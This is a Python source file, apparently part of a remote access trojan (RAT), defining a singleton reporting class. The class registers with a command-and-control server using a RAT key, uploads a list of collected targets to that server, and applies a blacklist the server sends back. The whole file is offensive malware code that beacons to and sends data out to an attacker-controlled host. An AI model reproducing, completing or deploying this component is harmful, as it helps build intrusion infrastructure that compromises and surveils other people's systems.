
import os
import requests
from tasker import TaskManager
from dotenv import load_dotenv
load_dotenv()

class Report:
    """ Report data to the c2 server """
    _instance = None
    def __new__(cls):
        """ Make class signleton """
        if cls._instance is None:
            cls._instance = super(Report, cls).__new__(cls)
        return cls._instance

    def __init__(self):
        self.key = os.environ.get("RAT_KEY")
        self.c2server = os.environ.get("C2_SERVER")
        self.s = requests.Session()
        res = self.s.post(self.c2server+"/api/v0/rat/register", json={"key": self.key})
        print(res.text)
        self.task_manager = TaskManager()

 


    def _update_target_list(self):
        """ Send report of target list and update task manager based on returned data """
        print("updating: ", self.task_manager.target_list.get_targets())
        response = self.s.post(
            self.c2server+"/api/v0/rat/targetlist",
            json={
                "targets": self.task_manager.target_list.get_targets()
                }
        )

        if response.status_code != 200:
            print(f"ERROR: Error occured while updating remote target list: {response.text}")

        data = response.json()
        self.task_manager.update_blacklist_from_c2(data['blacklist'])




    def run(self):
        """
            Run a general report.

            This function should send all reports to the c2 server every-time its called.
        """
        self._update_target_list()


